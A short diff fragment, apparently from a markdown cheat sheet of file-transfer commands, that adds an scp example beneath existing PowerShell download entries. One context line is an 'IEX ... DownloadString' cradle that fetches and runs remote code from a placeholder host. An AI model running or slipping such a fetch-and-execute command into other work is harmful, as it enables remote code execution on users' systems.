@@ -24,7 +24,9 @@ IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.txt')
 **Invoke-WebRequest**
 Invoke-WebRequest https://example.com/test.txt -OutFile test.txt -UseBasicParsing
 
-**
+**Secure Copy**
+scp file.txt user@192.168.1.10:/tmp/
+
 
 
 
